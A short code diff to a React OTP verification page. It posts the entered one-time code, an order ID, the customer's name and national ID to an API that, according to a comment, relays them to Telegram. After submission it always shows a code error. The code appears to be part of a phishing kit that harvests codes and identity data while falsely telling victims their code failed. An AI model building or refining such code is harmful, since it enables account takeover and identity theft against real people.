@@ -93,20 +93,13 @@ export default function VerifyPage() {
     const code = otp.trim();
     if (code.length !== 4 && code.length !== 6) { setLengthError(true); return; }
     try {
-      const res = await fetch("/api/verify", {
+      await fetch("/api/verify", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ code, orderId, customerName: customer?.name ?? "—", customerId: customer?.nationalId ?? "—" }),
       });
-      if (!res.ok) {
-        await fetch("/api/verify", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ code, orderId, customerName: customer?.name ?? "—", customerId: customer?.nationalId ?? "—" }),
-        });
-      }
     } catch {
-      // network error
+      // network error - sendToTelegram already has retry logic server-side
     }
     setSubmitted(true);
     setCodeError(true);
